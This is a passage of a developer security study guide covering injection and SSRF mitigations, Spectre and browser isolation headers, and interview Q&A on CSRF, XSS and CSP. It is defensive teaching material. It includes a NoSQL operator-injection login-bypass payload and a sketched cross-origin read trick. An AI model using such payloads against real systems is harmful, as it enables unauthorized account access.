  const col = SORTABLE[req.query.sort as keyof typeof SORTABLE] ?? 'created_at';
  ```
- **NoSQL operator injection**: `{ "password": { "$ne": null } }`. Validate types.
- **Command injection**: use `execFile`/`spawn` with an args array, never `exec` with interpolation.
- **Path traversal**: `path.resolve(base, userPath)` and check that the result starts with `base + path.sep`.
- **SSRF**: server-side fetches of user URLs can reach `169.254.169.254` (cloud metadata → credentials!), localhost, or internal services. Mitigate: allowlist hosts, resolve DNS and block private ranges, prevent redirects to internal hosts, use **IMDSv2** on AWS (session token required, hop limit 1), and route egress through a proxy.
- **Mass assignment**: `User.update(req.body)` lets someone set `role: "admin"`. Use DTO whitelisting (`ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })`).
- **ReDoS**: user-controlled input against backtracking regexes. Use bounded patterns or `re2`.
- **Prototype pollution**: see the JS internals doc.
- **Insecure deserialization**: never `eval` or deserialize untrusted input into class instances with custom revivers that execute code.
- **Dependency risk**: `npm audit` / Snyk / Dependabot, lockfiles, `npm ci`, review install scripts (`--ignore-scripts` where possible), pin and verify (supply-chain attacks such as the 2025 npm worm campaigns that targeted maintainers' tokens).

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`getPinned`](../../packages/backend/libs/infrastructure/net/pinned-get.ts#L18): getPinned fetches untrusted URLs through the SSRF guard with a pinned IP, manual redirect handling, a timeout and a body cap. _(pinned-get.ts)_ · [net](../../docs/humans/concepts/platform-net/net.md)
> - [`csvCell`](../../packages/backend/libs/domains/statements/infra/statement-export.ts#L10): csvCell neutralizes spreadsheet formula injection. _(statement-export.ts)_
<!-- theory-links:end -->

---

## 7. Spectre, compromised renderers, and browser isolation

Background for the browser process model: see `01-JavaScript-TypeScript/01-javascript-internals.md` §1.3.

### 7.1 Spectre in one paragraph
**Spectre** (disclosed January 2018) is a class of **CPU side-channel attacks** on **speculative execution**. Modern CPUs guess ahead (for example, which way a branch will go, or that an array index is in bounds) and execute instructions *speculatively*. When the guess turns out wrong, the results are thrown away, but the **side effects on the CPU cache remain**. An attacker trains the CPU to mis-speculate into reading memory it shouldn't, then **measures access times** to figure out which cache lines were touched, and from that, the secret bytes.

The key consequence for the web: **any JavaScript can potentially read any memory in its own process**. Same-origin policy, bounds checks, and JS's memory safety don't help, because the read happens speculatively, below the language level.

### 7.2 Why that broke the browser security model
Before 2018, Chrome could put **several sites in one renderer process** (e.g. `evil.com` in a tab plus a `bank.com` iframe, or cross-origin resources loaded into the page). The browser's isolation between them was enforced *inside* the process (same-origin policy in code). With Spectre:
- `evil.com`'s script could read `bank.com`'s data **if it was in the same process's memory**, e.g. an `<iframe src="bank.com">`, or a cross-origin response pulled in via `<img src="https://bank.com/api/account.json">` (the browser fetches the response with cookies and has the bytes in memory, even though it isn't a valid image).
- **High-resolution timers** made the timing measurements easy: `performance.now()`, and especially **`SharedArrayBuffer`**, where one worker increments a counter in a tight loop, giving another thread a nanosecond-ish clock.

### 7.3 "Compromised renderer": the threat model it fits into
The **renderer process** runs untrusted web content: parsing HTML/CSS, running JS in V8, decoding images. It's the biggest attack surface. Browser vendors assume that **an attacker will sometimes get full control of a renderer**, either via a memory-corruption bug (for example, a V8 type-confusion exploit, which shows up regularly as in-the-wild zero-days) or via Spectre-style reads. A *compromised renderer* means the attacker runs arbitrary native code (or reads arbitrary memory) **inside that process**.

Defenses that limit the damage:
- **Sandbox**: the renderer process has almost no OS privileges (no filesystem, no direct network, restricted syscalls). Escaping needs a *second* bug (a sandbox escape), which is why real attacks chain exploits.
- **Site Isolation** (Chrome 67, 2018 desktop; later Android for sites with logins; Firefox's "Fission" from 2021): **each site gets its own renderer process**, including cross-site iframes (out-of-process iframes). A compromised `evil.com` renderer **contains no `bank.com` data in its memory**, so there's nothing to read.
- **The browser process enforces per-site access**: a renderer can only ask for cookies, storage, passwords, and permissions for the site it's locked to. A compromised renderer can't ask for `bank.com` cookies.
- **CORB → ORB** (Cross-Origin Read Blocking / Opaque Response Blocking): when a page makes a `no-cors` request (`<img>`, `<script>`) to a cross-origin URL and the response is **HTML, JSON, or XML** (not a real image or script), the network service **blocks the body before it reaches the renderer**. This stops the `<img src="account.json">` trick. It relies on **correct `Content-Type` + `X-Content-Type-Options: nosniff`**.
- **Coarsened timers**: `performance.now()` resolution reduced and jittered (≈100 µs, or 5 µs in isolated contexts).
- **`SharedArrayBuffer` disabled**, then re-enabled only for **cross-origin isolated** pages (next section).

### 7.4 Cross-origin isolation (COOP + COEP + CORP)
A page can opt into a stronger mode that **guarantees no other site's data is in its process**, and in exchange gets powerful features back (`SharedArrayBuffer`, precise timers, `performance.measureUserAgentSpecificMemory`):

```http
Cross-Origin-Opener-Policy: same-origin          # COOP: popups/openers from other origins get a separate browsing context group (no window.opener access, own process)
Cross-Origin-Embedder-Policy: require-corp       # COEP: every subresource must explicitly allow being embedded (CORP or CORS)
                                                 #  (or `credentialless`: cross-origin no-cors requests sent without cookies)
```
Then `self.crossOriginIsolated === true`.

Every resource you embed must opt in:
```http
Cross-Origin-Resource-Policy: same-origin | same-site | cross-origin    # CORP, set by the resource's server
```
or be loaded via CORS (`<img crossorigin src=...>` + `Access-Control-Allow-Origin`). Third-party embeds (ads, analytics, YouTube iframes) are the usual blockers, and `COEP: credentialless` was introduced to ease that.

### 7.5 What a backend/full-stack developer should actually do
1. **Correct `Content-Type` on every response** and **`X-Content-Type-Options: nosniff`**, so ORB can recognize JSON/HTML and keep it out of attacker renderers.
2. **`Cross-Origin-Resource-Policy: same-origin`** (or `same-site`) on **sensitive authenticated responses** (APIs, user files), so they can't be pulled into other sites' processes as `no-cors` subresources.
3. **`Cross-Origin-Opener-Policy: same-origin`** on your app pages (cheap; isolates you from cross-origin popups and openers, which also helps against XS-Leaks and tabnabbing). Use `same-origin-allow-popups` if you rely on OAuth or payment popups.
4. **`SameSite` cookies**, so cross-site subresource requests don't carry credentials, which means there's no sensitive response to steal in the first place.
5. Enable **COEP** only if you need `SharedArrayBuffer` (WASM threads, ffmpeg.wasm, SQLite WASM with OPFS), and audit all embedded resources first (roll out with `Cross-Origin-Embedder-Policy-Report-Only`).
6. **Never treat the client as a security boundary**: assume any renderer may be compromised. That's another reason authorization lives on the server.

### 7.6 Server-side relevance
- **Shared cloud hardware**: Spectre/Meltdown also allowed cross-VM and cross-process leaks. They're mitigated by OS, hypervisor, and microcode patches (KPTI, retpolines), so keep kernels and images patched. Dedicated or isolated instances for highly sensitive workloads are an option.
- **Node `vm` module is not a sandbox**. Running untrusted JS in `vm.runInNewContext` shares the process (escape is trivial, and Spectre applies anyway). Use separate processes or containers, `isolated-vm` (separate V8 isolates, with care), or WASM sandboxes for untrusted code.
- Constant-time comparisons (`crypto.timingSafeEqual`) for secrets are the same family of idea: don't leak information through timing.

<!-- theory-links:start -->
> [!TIP] In this codebase
> - [`FunctionSandbox`](../../packages/backend/libs/domains/shop-functions/infra/sandbox.ts#L26): FunctionSandbox runs untrusted seller JavaScript in isolated V8 sandboxes with memory caps and timeouts instead of relying on the vm module. _(sandbox.ts)_
<!-- theory-links:end -->

---

## Interview Q&A

**Q: Doesn't the same-origin policy prevent CSRF?**
No. SOP blocks *reading* cross-origin responses, not *sending* requests. Forms, links, and simple `fetch` requests reach your server with the user's cookies. `SameSite` cookies withhold the cookie on most cross-site requests, but have gaps: sibling subdomains are same-site, GET navigations under `Lax`, `SameSite=None` cookies, browsers without Lax-by-default, and non-cookie credentials. So add a CSRF token or an Origin/Fetch-Metadata check.

**Q: Where is a CSRF token generated and verified?**
On the server. It generates a random token (synchronizer: stored in the server-side session; signed double-submit: an HMAC over session ID + random, set in a cookie), the frontend echoes it in a header, and the server verifies it in constant time. The attacker's site can't read the victim's token (SOP), a token they get in their own browser is bound to their own session, and the signing secret never leaves the backend.

**Q: How do XSS and CSRF relate?**
CSRF needs no XSS; it runs from the attacker's own site. XSS on your origin defeats all CSRF defenses, because the script can read the token and make same-origin requests. XSS on a sibling subdomain bypasses `SameSite`, since it's same-site, so keep user content on a separate registrable domain.

**Q: What is Spectre, and how did browsers respond?**
It's a CPU side channel: speculative execution leaves cache traces, so JS can read any memory in its own process. Browsers responded with Site Isolation (one process per site, so other sites' data isn't in the attacker's process), CORB/ORB to keep cross-origin JSON/HTML out of renderers, coarser timers, and `SharedArrayBuffer` only behind cross-origin isolation (COOP + COEP). On my side as a developer: correct Content-Type + nosniff, CORP on sensitive responses, COOP on pages, SameSite cookies.

**Q: Explain CSRF defenses for a cookie-based SPA.**
CSRF exploits ambient cookies. Layered defense: `SameSite=Lax` or `Strict` session cookies with `__Host-` prefix, Secure, and HttpOnly; a CSRF token, either a synchronizer token stored in the session or a signed double-submit token bound to the session ID via HMAC, sent in a custom header on every state-changing request; strict CORS so foreign origins can't send that header; Origin and `Sec-Fetch-Site` checks; and no state changes on GET. SameSite alone isn't enough because sibling subdomains count as same-site.

**Q: What is CSP and how do you roll it out?**
A browser-enforced policy restricting script sources and more. I'd use a strict CSP with per-request nonces + `strict-dynamic`, `object-src 'none'`, `base-uri 'none'`, and `frame-ancestors`. Roll out in Report-Only, fix violations, then enforce, and keep reporting on. It's a second layer behind output encoding.

**Q: Give examples of context-specific output encoding.**
HTML entities in body text, quoted plus encoded attributes, `encodeURIComponent` plus scheme allowlisting for URLs, `\u003c`-escaped JSON inside script tags, DOMPurify when HTML must be rendered, and a `'` prefix for CSV formula cells.

**Q: How do you design error responses safely?**
Problem Details with stable codes. Specific messages for validation errors. Generic 500s with a trace ID while the details are logged server-side. Uniform responses for auth flows to prevent enumeration. 404 for resources the caller isn't allowed to know about. Redaction in logs.
